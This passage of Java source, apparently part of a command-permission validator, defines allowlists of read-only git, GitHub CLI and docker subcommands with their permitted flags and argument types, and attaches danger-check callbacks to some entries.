        "--patch", FlagArgType.NONE, "-p", FlagArgType.NONE, "--no-patch", FlagArgType.NONE,
        "--no-ext-diff", FlagArgType.NONE, "-s", FlagArgType.NONE);
    private static final Map<String, FlagArgType> GIT_AUTHOR_FILTER_FLAGS = flags(
        "--author", FlagArgType.STRING, "--committer", FlagArgType.STRING, "--grep", FlagArgType.STRING);
    // ════════════════════════════════════════════════════════════════════════
    // GIT_READ_ONLY_COMMANDS · 对齐 CC readOnlyCommandValidation.ts:107-923（24 项）
    // ════════════════════════════════════════════════════════════════════════
    private static Map<String, FlagArgType> mergeFlags(Object... maps) {
        Map<String, FlagArgType> m = new LinkedHashMap<>();
        for (Object o : maps) {
            @SuppressWarnings("unchecked")
            Map<String, FlagArgType> mm = (Map<String, FlagArgType>) o;
            m.putAll(mm);
        }
        return m;
    }
    static final Map<String, ExternalCommandConfig> GIT_READ_ONLY_COMMANDS = Map.ofEntries(
        Map.entry("git diff", new ExternalCommandConfig(mergeFlags(GIT_STAT_FLAGS, GIT_COLOR_FLAGS,
            flags("--dirstat", FlagArgType.NONE, "--summary", FlagArgType.NONE, "--patch-with-stat", FlagArgType.NONE,
                "--word-diff", FlagArgType.NONE, "--word-diff-regex", FlagArgType.STRING, "--color-words", FlagArgType.NONE,
                "--no-renames", FlagArgType.NONE, "--no-ext-diff", FlagArgType.NONE, "--check", FlagArgType.NONE,
                "--ws-error-highlight", FlagArgType.STRING, "--full-index", FlagArgType.NONE, "--binary", FlagArgType.NONE,
                "--abbrev", FlagArgType.NUMBER, "--break-rewrites", FlagArgType.NONE, "--find-renames", FlagArgType.NONE,
                "--find-copies", FlagArgType.NONE, "--find-copies-harder", FlagArgType.NONE, "--irreversible-delete", FlagArgType.NONE,
                "--diff-algorithm", FlagArgType.STRING, "--histogram", FlagArgType.NONE, "--patience", FlagArgType.NONE,
                "--minimal", FlagArgType.NONE, "--ignore-space-at-eol", FlagArgType.NONE, "--ignore-space-change", FlagArgType.NONE,
                "--ignore-all-space", FlagArgType.NONE, "--ignore-blank-lines", FlagArgType.NONE, "--inter-hunk-context", FlagArgType.NUMBER,
                "--function-context", FlagArgType.NONE, "--exit-code", FlagArgType.NONE, "--quiet", FlagArgType.NONE,
                "--cached", FlagArgType.NONE, "--staged", FlagArgType.NONE, "--pickaxe-regex", FlagArgType.NONE,
                "--pickaxe-all", FlagArgType.NONE, "--no-index", FlagArgType.NONE, "--relative", FlagArgType.STRING,
                "--diff-filter", FlagArgType.STRING, "-p", FlagArgType.NONE, "-u", FlagArgType.NONE, "-s", FlagArgType.NONE,
                "-M", FlagArgType.NONE, "-C", FlagArgType.NONE, "-B", FlagArgType.NONE, "-D", FlagArgType.NONE,
                "-l", FlagArgType.NONE, "-S", FlagArgType.STRING, "-G", FlagArgType.STRING, "-O", FlagArgType.STRING,
                "-R", FlagArgType.NONE)), true)),
        Map.entry("git log", new ExternalCommandConfig(mergeFlags(GIT_LOG_DISPLAY_FLAGS, GIT_REF_SELECTION_FLAGS,
            GIT_DATE_FILTER_FLAGS, GIT_COUNT_FLAGS, GIT_STAT_FLAGS, GIT_COLOR_FLAGS, GIT_PATCH_FLAGS,
            GIT_AUTHOR_FILTER_FLAGS,
            flags("--abbrev-commit", FlagArgType.NONE, "--full-history", FlagArgType.NONE, "--dense", FlagArgType.NONE,
                "--sparse", FlagArgType.NONE, "--simplify-merges", FlagArgType.NONE, "--ancestry-path", FlagArgType.NONE,
                "--source", FlagArgType.NONE, "--first-parent", FlagArgType.NONE, "--merges", FlagArgType.NONE,
                "--no-merges", FlagArgType.NONE, "--reverse", FlagArgType.NONE, "--walk-reflogs", FlagArgType.NONE,
                "--skip", FlagArgType.NUMBER, "--max-age", FlagArgType.NUMBER, "--min-age", FlagArgType.NUMBER,
                "--no-min-parents", FlagArgType.NONE, "--no-max-parents", FlagArgType.NONE, "--follow", FlagArgType.NONE,
                "--no-walk", FlagArgType.NONE, "--left-right", FlagArgType.NONE, "--cherry-mark", FlagArgType.NONE,
                "--cherry-pick", FlagArgType.NONE, "--boundary", FlagArgType.NONE, "--topo-order", FlagArgType.NONE,
                "--date-order", FlagArgType.NONE, "--author-date-order", FlagArgType.NONE, "--pretty", FlagArgType.STRING,
                "--format", FlagArgType.STRING, "--diff-filter", FlagArgType.STRING, "-S", FlagArgType.STRING,
                "-G", FlagArgType.STRING, "--pickaxe-regex", FlagArgType.NONE, "--pickaxe-all", FlagArgType.NONE)), true)),
        Map.entry("git show", new ExternalCommandConfig(mergeFlags(GIT_LOG_DISPLAY_FLAGS, GIT_STAT_FLAGS, GIT_COLOR_FLAGS,
            GIT_PATCH_FLAGS,
            flags("--abbrev-commit", FlagArgType.NONE, "--word-diff", FlagArgType.NONE, "--word-diff-regex", FlagArgType.STRING,
                "--color-words", FlagArgType.NONE, "--pretty", FlagArgType.STRING, "--format", FlagArgType.STRING,
                "--first-parent", FlagArgType.NONE, "--raw", FlagArgType.NONE, "--diff-filter", FlagArgType.STRING,
                "-m", FlagArgType.NONE, "--quiet", FlagArgType.NONE)), true)),
        Map.entry("git shortlog", new ExternalCommandConfig(mergeFlags(GIT_REF_SELECTION_FLAGS, GIT_DATE_FILTER_FLAGS,
            flags("-s", FlagArgType.NONE, "--summary", FlagArgType.NONE, "-n", FlagArgType.NONE, "--numbered", FlagArgType.NONE,
                "-e", FlagArgType.NONE, "--email", FlagArgType.NONE, "-c", FlagArgType.NONE, "--committer", FlagArgType.NONE,
                "--group", FlagArgType.STRING, "--format", FlagArgType.STRING, "--no-merges", FlagArgType.NONE,
                "--author", FlagArgType.STRING)), true)),
        Map.entry("git reflog", ExternalCommandConfig.exCallback(ReadOnlyCommandTable::gitReflogDangerous, mergeFlags(GIT_LOG_DISPLAY_FLAGS,
            GIT_REF_SELECTION_FLAGS, GIT_DATE_FILTER_FLAGS, GIT_COUNT_FLAGS, GIT_AUTHOR_FILTER_FLAGS))),
        Map.entry("git stash list", new ExternalCommandConfig(mergeFlags(GIT_LOG_DISPLAY_FLAGS, GIT_REF_SELECTION_FLAGS,
            GIT_COUNT_FLAGS), true)),
        Map.entry("git ls-remote", new ExternalCommandConfig(flags("--branches", FlagArgType.NONE, "-b", FlagArgType.NONE,
            "--tags", FlagArgType.NONE, "-t", FlagArgType.NONE, "--heads", FlagArgType.NONE, "-h", FlagArgType.NONE,
            "--refs", FlagArgType.NONE, "--quiet", FlagArgType.NONE, "-q", FlagArgType.NONE, "--exit-code", FlagArgType.NONE,
            "--get-url", FlagArgType.NONE, "--symref", FlagArgType.NONE, "--sort", FlagArgType.STRING), true)),
        Map.entry("git status", new ExternalCommandConfig(flags("--short", FlagArgType.NONE, "-s", FlagArgType.NONE,
            "--branch", FlagArgType.NONE, "-b", FlagArgType.NONE, "--porcelain", FlagArgType.NONE, "--long", FlagArgType.NONE,
            "--verbose", FlagArgType.NONE, "-v", FlagArgType.NONE, "--untracked-files", FlagArgType.STRING,
            "-u", FlagArgType.STRING, "--ignored", FlagArgType.NONE, "--ignore-submodules", FlagArgType.STRING,
            "--column", FlagArgType.NONE, "--no-column", FlagArgType.NONE, "--ahead-behind", FlagArgType.NONE,
            "--no-ahead-behind", FlagArgType.NONE, "--renames", FlagArgType.NONE, "--no-renames", FlagArgType.NONE,
            "--find-renames", FlagArgType.STRING, "-M", FlagArgType.STRING), true)),
        Map.entry("git blame", new ExternalCommandConfig(mergeFlags(GIT_COLOR_FLAGS,
            flags("-L", FlagArgType.STRING, "--porcelain", FlagArgType.NONE, "-p", FlagArgType.NONE,
                "--line-porcelain", FlagArgType.NONE, "--incremental", FlagArgType.NONE, "--root", FlagArgType.NONE,
                "--show-stats", FlagArgType.NONE, "--show-name", FlagArgType.NONE, "--show-number", FlagArgType.NONE,
                "-n", FlagArgType.NONE, "--show-email", FlagArgType.NONE, "-e", FlagArgType.NONE, "-f", FlagArgType.NONE,
                "--date", FlagArgType.STRING, "-w", FlagArgType.NONE, "--ignore-rev", FlagArgType.STRING,
                "--ignore-revs-file", FlagArgType.STRING, "-M", FlagArgType.NONE, "-C", FlagArgType.NONE,
                "--score-debug", FlagArgType.NONE, "--abbrev", FlagArgType.NUMBER, "-s", FlagArgType.NONE,
                "-l", FlagArgType.NONE, "-t", FlagArgType.NONE)), true)),
        Map.entry("git ls-files", new ExternalCommandConfig(flags("--cached", FlagArgType.NONE, "-c", FlagArgType.NONE,
            "--deleted", FlagArgType.NONE, "-d", FlagArgType.NONE, "--modified", FlagArgType.NONE, "-m", FlagArgType.NONE,
            "--others", FlagArgType.NONE, "-o", FlagArgType.NONE, "--ignored", FlagArgType.NONE, "-i", FlagArgType.NONE,
            "--stage", FlagArgType.NONE, "-s", FlagArgType.NONE, "--killed", FlagArgType.NONE, "-k", FlagArgType.NONE,
            "--unmerged", FlagArgType.NONE, "-u", FlagArgType.NONE, "--directory", FlagArgType.NONE,
            "--no-empty-directory", FlagArgType.NONE, "--eol", FlagArgType.NONE, "--full-name", FlagArgType.NONE,
            "--abbrev", FlagArgType.NUMBER, "--debug", FlagArgType.NONE, "-z", FlagArgType.NONE, "-t", FlagArgType.NONE,
            "-v", FlagArgType.NONE, "-f", FlagArgType.NONE, "--exclude", FlagArgType.STRING, "-x", FlagArgType.STRING,
            "--exclude-from", FlagArgType.STRING, "-X", FlagArgType.STRING, "--exclude-per-directory", FlagArgType.STRING,
            "--exclude-standard", FlagArgType.NONE, "--error-unmatch", FlagArgType.NONE,
            "--recurse-submodules", FlagArgType.NONE), true)),
        Map.entry("git config --get", new ExternalCommandConfig(flags("--local", FlagArgType.NONE, "--global", FlagArgType.NONE,
            "--system", FlagArgType.NONE, "--worktree", FlagArgType.NONE, "--default", FlagArgType.STRING,
            "--type", FlagArgType.STRING, "--bool", FlagArgType.NONE, "--int", FlagArgType.NONE,
            "--bool-or-int", FlagArgType.NONE, "--path", FlagArgType.NONE, "--expiry-date", FlagArgType.NONE,
            "-z", FlagArgType.NONE, "--null", FlagArgType.NONE, "--name-only", FlagArgType.NONE,
            "--show-origin", FlagArgType.NONE, "--show-scope", FlagArgType.NONE), true)),
        Map.entry("git remote show", ExternalCommandConfig.exCallback(ReadOnlyCommandTable::gitRemoteShowDangerous, flags("-n", FlagArgType.NONE))),
        Map.entry("git remote", ExternalCommandConfig.exCallback(ReadOnlyCommandTable::gitRemoteDangerous, flags("-v", FlagArgType.NONE, "--verbose", FlagArgType.NONE))),
        Map.entry("git merge-base", new ExternalCommandConfig(flags("--is-ancestor", FlagArgType.NONE,
            "--fork-point", FlagArgType.NONE, "--octopus", FlagArgType.NONE, "--independent", FlagArgType.NONE,
            "--all", FlagArgType.NONE), true)),
        Map.entry("git rev-parse", new ExternalCommandConfig(flags("--verify", FlagArgType.NONE,
            "--short", FlagArgType.STRING, "--abbrev-ref", FlagArgType.NONE, "--symbolic", FlagArgType.NONE,
            "--symbolic-full-name", FlagArgType.NONE, "--show-toplevel", FlagArgType.NONE, "--show-cdup", FlagArgType.NONE,
            "--show-prefix", FlagArgType.NONE, "--git-dir", FlagArgType.NONE, "--git-common-dir", FlagArgType.NONE,
            "--absolute-git-dir", FlagArgType.NONE, "--show-superproject-working-tree", FlagArgType.NONE,
            "--is-inside-work-tree", FlagArgType.NONE, "--is-inside-git-dir", FlagArgType.NONE,
            "--is-bare-repository", FlagArgType.NONE, "--is-shallow-repository", FlagArgType.NONE,
            "--is-shallow-update", FlagArgType.NONE, "--path-prefix", FlagArgType.NONE), true)),
        Map.entry("git rev-list", new ExternalCommandConfig(mergeFlags(GIT_REF_SELECTION_FLAGS, GIT_DATE_FILTER_FLAGS,
            GIT_COUNT_FLAGS, GIT_AUTHOR_FILTER_FLAGS,
            flags("--count", FlagArgType.NONE, "--reverse", FlagArgType.NONE, "--first-parent", FlagArgType.NONE,
                "--ancestry-path", FlagArgType.NONE, "--merges", FlagArgType.NONE, "--no-merges", FlagArgType.NONE,
                "--min-parents", FlagArgType.NUMBER, "--max-parents", FlagArgType.NUMBER, "--no-min-parents", FlagArgType.NONE,
                "--no-max-parents", FlagArgType.NONE, "--skip", FlagArgType.NUMBER, "--max-age", FlagArgType.NUMBER,
                "--min-age", FlagArgType.NUMBER, "--walk-reflogs", FlagArgType.NONE, "--oneline", FlagArgType.NONE,
                "--abbrev-commit", FlagArgType.NONE, "--pretty", FlagArgType.STRING, "--format", FlagArgType.STRING,
                "--abbrev", FlagArgType.NUMBER, "--full-history", FlagArgType.NONE, "--dense", FlagArgType.NONE,
                "--sparse", FlagArgType.NONE, "--source", FlagArgType.NONE, "--graph", FlagArgType.NONE)), true)),
        Map.entry("git describe", new ExternalCommandConfig(flags("--tags", FlagArgType.NONE, "--match", FlagArgType.STRING,
            "--exclude", FlagArgType.STRING, "--long", FlagArgType.NONE, "--abbrev", FlagArgType.NUMBER,
            "--always", FlagArgType.NONE, "--contains", FlagArgType.NONE, "--first-match", FlagArgType.NONE,
            "--exact-match", FlagArgType.NONE, "--candidates", FlagArgType.NUMBER, "--dirty", FlagArgType.NONE,
            "--broken", FlagArgType.NONE), true)),
        Map.entry("git cat-file", new ExternalCommandConfig(flags("-t", FlagArgType.NONE, "-s", FlagArgType.NONE,
            "-p", FlagArgType.NONE, "-e", FlagArgType.NONE, "--batch-check", FlagArgType.NONE,
            "--allow-undetermined-type", FlagArgType.NONE), true)),
        Map.entry("git for-each-ref", new ExternalCommandConfig(flags("--format", FlagArgType.STRING,
            "--sort", FlagArgType.STRING, "--count", FlagArgType.NUMBER, "--contains", FlagArgType.STRING,
            "--no-contains", FlagArgType.STRING, "--merged", FlagArgType.STRING, "--no-merged", FlagArgType.STRING,
            "--points-at", FlagArgType.STRING), true)),
        Map.entry("git grep", new ExternalCommandConfig(flags("-e", FlagArgType.STRING, "-E", FlagArgType.NONE,
            "--extended-regexp", FlagArgType.NONE, "-G", FlagArgType.NONE, "--basic-regexp", FlagArgType.NONE,
            "-F", FlagArgType.NONE, "--fixed-strings", FlagArgType.NONE, "-P", FlagArgType.NONE,
            "--perl-regexp", FlagArgType.NONE, "-i", FlagArgType.NONE, "--ignore-case", FlagArgType.NONE,
            "-v", FlagArgType.NONE, "--invert-match", FlagArgType.NONE, "-w", FlagArgType.NONE,
            "--word-regexp", FlagArgType.NONE, "-n", FlagArgType.NONE, "--line-number", FlagArgType.NONE,
            "-c", FlagArgType.NONE, "--count", FlagArgType.NONE, "-l", FlagArgType.NONE,
            "--files-with-matches", FlagArgType.NONE, "-L", FlagArgType.NONE, "--files-without-match", FlagArgType.NONE,
            "-h", FlagArgType.NONE, "-H", FlagArgType.NONE, "--heading", FlagArgType.NONE, "--break", FlagArgType.NONE,
            "--full-name", FlagArgType.NONE, "--color", FlagArgType.NONE, "--no-color", FlagArgType.NONE,
            "-o", FlagArgType.NONE, "--only-matching", FlagArgType.NONE, "-A", FlagArgType.NUMBER,
            "--after-context", FlagArgType.NUMBER, "-B", FlagArgType.NUMBER, "--before-context", FlagArgType.NUMBER,
            "-C", FlagArgType.NUMBER, "--context", FlagArgType.NUMBER, "--and", FlagArgType.NONE, "--or", FlagArgType.NONE,
            "--not", FlagArgType.NONE, "--max-depth", FlagArgType.NUMBER, "--untracked", FlagArgType.NONE,
            "--no-index", FlagArgType.NONE, "--recurse-submodules", FlagArgType.NONE, "--cached", FlagArgType.NONE,
            "--threads", FlagArgType.NUMBER, "-q", FlagArgType.NONE, "--quiet", FlagArgType.NONE), true)),
        Map.entry("git stash show", new ExternalCommandConfig(mergeFlags(GIT_STAT_FLAGS, GIT_COLOR_FLAGS, GIT_PATCH_FLAGS,
            flags("--word-diff", FlagArgType.NONE, "--word-diff-regex", FlagArgType.STRING, "--diff-filter", FlagArgType.STRING,
                "--abbrev", FlagArgType.NUMBER)), true)),
        Map.entry("git worktree list", new ExternalCommandConfig(flags("--porcelain", FlagArgType.NONE,
            "-v", FlagArgType.NONE, "--verbose", FlagArgType.NONE, "--expire", FlagArgType.STRING), true)),
        Map.entry("git tag", ExternalCommandConfig.exCallback(ReadOnlyCommandTable::gitTagDangerous, flags("-l", FlagArgType.NONE,
            "--list", FlagArgType.NONE, "-n", FlagArgType.NUMBER, "--contains", FlagArgType.STRING,
            "--no-contains", FlagArgType.STRING, "--merged", FlagArgType.STRING, "--no-merged", FlagArgType.STRING,
            "--sort", FlagArgType.STRING, "--format", FlagArgType.STRING, "--points-at", FlagArgType.STRING,
            "--column", FlagArgType.NONE, "--no-column", FlagArgType.NONE, "-i", FlagArgType.NONE,
            "--ignore-case", FlagArgType.NONE))),
        Map.entry("git branch", ExternalCommandConfig.exCallback(ReadOnlyCommandTable::gitBranchDangerous, flags("-l", FlagArgType.NONE,
            "--list", FlagArgType.NONE, "-a", FlagArgType.NONE, "--all", FlagArgType.NONE, "-r", FlagArgType.NONE,
            "--remotes", FlagArgType.NONE, "-v", FlagArgType.NONE, "-vv", FlagArgType.NONE, "--verbose", FlagArgType.NONE,
            "--color", FlagArgType.NONE, "--no-color", FlagArgType.NONE, "--column", FlagArgType.NONE,
            "--no-column", FlagArgType.NONE, "--abbrev", FlagArgType.NUMBER, "--no-abbrev", FlagArgType.NONE,
            "--contains", FlagArgType.STRING, "--no-contains", FlagArgType.STRING, "--merged", FlagArgType.NONE,
            "--no-merged", FlagArgType.NONE, "--points-at", FlagArgType.STRING, "--sort", FlagArgType.STRING,
            "--show-current", FlagArgType.NONE, "-i", FlagArgType.NONE, "--ignore-case", FlagArgType.NONE)))
    );
    // ════════════════════════════════════════════════════════════════════════
    // GH_READ_ONLY_COMMANDS · 对齐 CC readOnlyCommandValidation.ts:984-1380（22 项）
    // 注：仅 17 项挂 ghIsDangerousCallback（CC 真源 :993-1216）；5 项 search 命令（repos/issues/prs/
    // commits/code，:1220-1379）CC 未挂回调——按 CC 如实执行，不额外挂载。
    // ════════════════════════════════════════════════════════════════════════
    static final Map<String, ExternalCommandConfig> GH_READ_ONLY_COMMANDS = Map.ofEntries(
        Map.entry("gh pr view", ExternalCommandConfig.exCallback(ReadOnlyCommandTable::ghIsDangerousCallback, flags("--json", FlagArgType.STRING,
            "--comments", FlagArgType.NONE, "--repo", FlagArgType.STRING, "-R", FlagArgType.STRING))),
        Map.entry("gh pr list", ExternalCommandConfig.exCallback(ReadOnlyCommandTable::ghIsDangerousCallback, flags("--state", FlagArgType.STRING,
            "-s", FlagArgType.STRING, "--author", FlagArgType.STRING, "--assignee", FlagArgType.STRING,
            "--label", FlagArgType.STRING, "--limit", FlagArgType.NUMBER, "-L", FlagArgType.NUMBER,
            "--base", FlagArgType.STRING, "--head", FlagArgType.STRING, "--search", FlagArgType.STRING,
            "--json", FlagArgType.STRING, "--draft", FlagArgType.NONE, "--app", FlagArgType.STRING,
            "--repo", FlagArgType.STRING, "-R", FlagArgType.STRING))),
        Map.entry("gh pr diff", ExternalCommandConfig.exCallback(ReadOnlyCommandTable::ghIsDangerousCallback, flags("--color", FlagArgType.STRING,
            "--name-only", FlagArgType.NONE, "--patch", FlagArgType.NONE, "--repo", FlagArgType.STRING,
            "-R", FlagArgType.STRING))),
        Map.entry("gh pr checks", ExternalCommandConfig.exCallback(ReadOnlyCommandTable::ghIsDangerousCallback, flags("--watch", FlagArgType.NONE,
            "--required", FlagArgType.NONE, "--fail-fast", FlagArgType.NONE, "--json", FlagArgType.STRING,
            "--interval", FlagArgType.NUMBER, "--repo", FlagArgType.STRING, "-R", FlagArgType.STRING))),
        Map.entry("gh issue view", ExternalCommandConfig.exCallback(ReadOnlyCommandTable::ghIsDangerousCallback, flags("--json", FlagArgType.STRING,
            "--comments", FlagArgType.NONE, "--repo", FlagArgType.STRING, "-R", FlagArgType.STRING))),
        Map.entry("gh issue list", ExternalCommandConfig.exCallback(ReadOnlyCommandTable::ghIsDangerousCallback, flags("--state", FlagArgType.STRING,
            "-s", FlagArgType.STRING, "--assignee", FlagArgType.STRING, "--author", FlagArgType.STRING,
            "--label", FlagArgType.STRING, "--limit", FlagArgType.NUMBER, "-L", FlagArgType.NUMBER,
            "--milestone", FlagArgType.STRING, "--search", FlagArgType.STRING, "--json", FlagArgType.STRING,
            "--app", FlagArgType.STRING, "--repo", FlagArgType.STRING, "-R", FlagArgType.STRING))),
        Map.entry("gh repo view", ExternalCommandConfig.exCallback(ReadOnlyCommandTable::ghIsDangerousCallback, flags("--json", FlagArgType.STRING))),
        Map.entry("gh run list", ExternalCommandConfig.exCallback(ReadOnlyCommandTable::ghIsDangerousCallback, flags("--branch", FlagArgType.STRING,
            "-b", FlagArgType.STRING, "--status", FlagArgType.STRING, "-s", FlagArgType.STRING, "--workflow", FlagArgType.STRING,
            "-w", FlagArgType.STRING, "--limit", FlagArgType.NUMBER, "-L", FlagArgType.NUMBER, "--json", FlagArgType.STRING,
            "--repo", FlagArgType.STRING, "-R", FlagArgType.STRING, "--event", FlagArgType.STRING, "-e", FlagArgType.STRING,
            "--user", FlagArgType.STRING, "-u", FlagArgType.STRING, "--created", FlagArgType.STRING, "--commit", FlagArgType.STRING,
            "-c", FlagArgType.STRING))),
        Map.entry("gh run view", ExternalCommandConfig.exCallback(ReadOnlyCommandTable::ghIsDangerousCallback, flags("--log", FlagArgType.NONE,
            "--log-failed", FlagArgType.NONE, "--exit-status", FlagArgType.NONE, "--verbose", FlagArgType.NONE,
            "-v", FlagArgType.NONE, "--json", FlagArgType.STRING, "--repo", FlagArgType.STRING, "-R", FlagArgType.STRING,
            "--job", FlagArgType.STRING, "-j", FlagArgType.STRING, "--attempt", FlagArgType.NUMBER, "-a", FlagArgType.NUMBER))),
        Map.entry("gh auth status", ExternalCommandConfig.exCallback(ReadOnlyCommandTable::ghIsDangerousCallback, flags("--active", FlagArgType.NONE,
            "-a", FlagArgType.NONE, "--hostname", FlagArgType.STRING, "-h", FlagArgType.STRING, "--json", FlagArgType.STRING))),
        Map.entry("gh pr status", ExternalCommandConfig.exCallback(ReadOnlyCommandTable::ghIsDangerousCallback, flags("--conflict-status", FlagArgType.NONE,
            "-c", FlagArgType.NONE, "--json", FlagArgType.STRING, "--repo", FlagArgType.STRING, "-R", FlagArgType.STRING))),
        Map.entry("gh issue status", ExternalCommandConfig.exCallback(ReadOnlyCommandTable::ghIsDangerousCallback, flags("--json", FlagArgType.STRING,
            "--repo", FlagArgType.STRING, "-R", FlagArgType.STRING))),
        Map.entry("gh release list", ExternalCommandConfig.exCallback(ReadOnlyCommandTable::ghIsDangerousCallback, flags("--exclude-drafts", FlagArgType.NONE,
            "--exclude-pre-releases", FlagArgType.NONE, "--json", FlagArgType.STRING, "--limit", FlagArgType.NUMBER,
            "-L", FlagArgType.NUMBER, "--order", FlagArgType.STRING, "-O", FlagArgType.STRING, "--repo", FlagArgType.STRING,
            "-R", FlagArgType.STRING))),
        Map.entry("gh release view", ExternalCommandConfig.exCallback(ReadOnlyCommandTable::ghIsDangerousCallback, flags("--json", FlagArgType.STRING,
            "--repo", FlagArgType.STRING, "-R", FlagArgType.STRING))),
        Map.entry("gh workflow list", ExternalCommandConfig.exCallback(ReadOnlyCommandTable::ghIsDangerousCallback, flags("--all", FlagArgType.NONE,
            "-a", FlagArgType.NONE, "--json", FlagArgType.STRING, "--limit", FlagArgType.NUMBER, "-L", FlagArgType.NUMBER,
            "--repo", FlagArgType.STRING, "-R", FlagArgType.STRING))),
        Map.entry("gh workflow view", ExternalCommandConfig.exCallback(ReadOnlyCommandTable::ghIsDangerousCallback, flags("--ref", FlagArgType.STRING,
            "-r", FlagArgType.STRING, "--yaml", FlagArgType.NONE, "-y", FlagArgType.NONE, "--repo", FlagArgType.STRING,
            "-R", FlagArgType.STRING))),
        Map.entry("gh label list", ExternalCommandConfig.exCallback(ReadOnlyCommandTable::ghIsDangerousCallback, flags("--json", FlagArgType.STRING,
            "--limit", FlagArgType.NUMBER, "-L", FlagArgType.NUMBER, "--order", FlagArgType.STRING,
            "--search", FlagArgType.STRING, "-S", FlagArgType.STRING, "--sort", FlagArgType.STRING,
            "--repo", FlagArgType.STRING, "-R", FlagArgType.STRING))),
        Map.entry("gh search repos", new ExternalCommandConfig(flags("--archived", FlagArgType.NONE,
            "--created", FlagArgType.STRING, "--followers", FlagArgType.STRING, "--forks", FlagArgType.STRING,
            "--good-first-issues", FlagArgType.STRING, "--help-wanted-issues", FlagArgType.STRING,
            "--include-forks", FlagArgType.STRING, "--json", FlagArgType.STRING, "--language", FlagArgType.STRING,
            "--license", FlagArgType.STRING, "--limit", FlagArgType.NUMBER, "-L", FlagArgType.NUMBER,
            "--match", FlagArgType.STRING, "--number-topics", FlagArgType.STRING, "--order", FlagArgType.STRING,
            "--owner", FlagArgType.STRING, "--size", FlagArgType.STRING, "--sort", FlagArgType.STRING,
            "--stars", FlagArgType.STRING, "--topic", FlagArgType.STRING, "--updated", FlagArgType.STRING,
            "--visibility", FlagArgType.STRING), true)),
        Map.entry("gh search issues", new ExternalCommandConfig(flags("--app", FlagArgType.STRING,
            "--assignee", FlagArgType.STRING, "--author", FlagArgType.STRING, "--closed", FlagArgType.STRING,
            "--commenter", FlagArgType.STRING, "--comments", FlagArgType.STRING, "--created", FlagArgType.STRING,
            "--include-prs", FlagArgType.NONE, "--interactions", FlagArgType.STRING, "--involves", FlagArgType.STRING,
            "--json", FlagArgType.STRING, "--label", FlagArgType.STRING, "--language", FlagArgType.STRING,
            "--limit", FlagArgType.NUMBER, "-L", FlagArgType.NUMBER, "--locked", FlagArgType.NONE,
            "--match", FlagArgType.STRING, "--mentions", FlagArgType.STRING, "--milestone", FlagArgType.STRING,
            "--no-assignee", FlagArgType.NONE, "--no-label", FlagArgType.NONE, "--no-milestone", FlagArgType.NONE,
            "--no-project", FlagArgType.NONE, "--order", FlagArgType.STRING, "--owner", FlagArgType.STRING,
            "--project", FlagArgType.STRING, "--reactions", FlagArgType.STRING, "--repo", FlagArgType.STRING,
            "-R", FlagArgType.STRING, "--sort", FlagArgType.STRING, "--state", FlagArgType.STRING,
            "--team-mentions", FlagArgType.STRING, "--updated", FlagArgType.STRING, "--visibility", FlagArgType.STRING), true)),
        Map.entry("gh search prs", new ExternalCommandConfig(flags("--app", FlagArgType.STRING,
            "--assignee", FlagArgType.STRING, "--author", FlagArgType.STRING, "--base", FlagArgType.STRING,
            "-B", FlagArgType.STRING, "--checks", FlagArgType.STRING, "--closed", FlagArgType.STRING,
            "--commenter", FlagArgType.STRING, "--comments", FlagArgType.STRING, "--created", FlagArgType.STRING,
            "--draft", FlagArgType.NONE, "--head", FlagArgType.STRING, "-H", FlagArgType.STRING,
            "--interactions", FlagArgType.STRING, "--involves", FlagArgType.STRING, "--json", FlagArgType.STRING,
            "--label", FlagArgType.STRING, "--language", FlagArgType.STRING, "--limit", FlagArgType.NUMBER,
            "-L", FlagArgType.NUMBER, "--locked", FlagArgType.NONE, "--match", FlagArgType.STRING,
            "--mentions", FlagArgType.STRING, "--merged", FlagArgType.NONE, "--merged-at", FlagArgType.STRING,
            "--milestone", FlagArgType.STRING, "--no-assignee", FlagArgType.NONE, "--no-label", FlagArgType.NONE,
            "--no-milestone", FlagArgType.NONE, "--no-project", FlagArgType.NONE, "--order", FlagArgType.STRING,
            "--owner", FlagArgType.STRING, "--project", FlagArgType.STRING, "--reactions", FlagArgType.STRING,
            "--repo", FlagArgType.STRING, "-R", FlagArgType.STRING, "--review", FlagArgType.STRING,
            "--review-requested", FlagArgType.STRING, "--reviewed-by", FlagArgType.STRING, "--sort", FlagArgType.STRING,
            "--state", FlagArgType.STRING, "--team-mentions", FlagArgType.STRING, "--updated", FlagArgType.STRING,
            "--visibility", FlagArgType.STRING), true)),
        Map.entry("gh search commits", new ExternalCommandConfig(flags("--author", FlagArgType.STRING,
            "--author-date", FlagArgType.STRING, "--author-email", FlagArgType.STRING, "--author-name", FlagArgType.STRING,
            "--committer", FlagArgType.STRING, "--committer-date", FlagArgType.STRING, "--committer-email", FlagArgType.STRING,
            "--committer-name", FlagArgType.STRING, "--hash", FlagArgType.STRING, "--json", FlagArgType.STRING,
            "--limit", FlagArgType.NUMBER, "-L", FlagArgType.NUMBER, "--merge", FlagArgType.NONE,
            "--order", FlagArgType.STRING, "--owner", FlagArgType.STRING, "--parent", FlagArgType.STRING,
            "--repo", FlagArgType.STRING, "-R", FlagArgType.STRING, "--sort", FlagArgType.STRING,
            "--tree", FlagArgType.STRING, "--visibility", FlagArgType.STRING), true)),
        Map.entry("gh search code", new ExternalCommandConfig(flags("--extension", FlagArgType.STRING,
            "--filename", FlagArgType.STRING, "--json", FlagArgType.STRING, "--language", FlagArgType.STRING,
            "--limit", FlagArgType.NUMBER, "-L", FlagArgType.NUMBER, "--match", FlagArgType.STRING,
            "--owner", FlagArgType.STRING, "--repo", FlagArgType.STRING, "-R", FlagArgType.STRING,
            "--size", FlagArgType.STRING), true))
    );

    // ════════════════════════════════════════════════════════════════════════
    // DOCKER_READ_ONLY_COMMANDS + EXTERNAL_READONLY_COMMANDS
    // ════════════════════════════════════════════════════════════════════════
    static final Map<String, ExternalCommandConfig> DOCKER_READ_ONLY_COMMANDS = Map.ofEntries(
        Map.entry("docker logs", new ExternalCommandConfig(flags("--follow", FlagArgType.NONE, "-f", FlagArgType.NONE,
            "--tail", FlagArgType.STRING, "-n", FlagArgType.STRING, "--timestamps", FlagArgType.NONE,
            "-t", FlagArgType.NONE, "--since", FlagArgType.STRING, "--until", FlagArgType.STRING,
            "--details", FlagArgType.NONE), true)),
        Map.entry("docker inspect", new ExternalCommandConfig(flags("--format", FlagArgType.STRING,
            "-f", FlagArgType.STRING, "--type", FlagArgType.STRING, "--size", FlagArgType.NONE,
            "-s", FlagArgType.NONE), true))
    );

    /**
     * PYRIGHT_READ_ONLY_COMMANDS · 对齐 CC readOnlyCommandValidation.ts:1501-1528。
     *
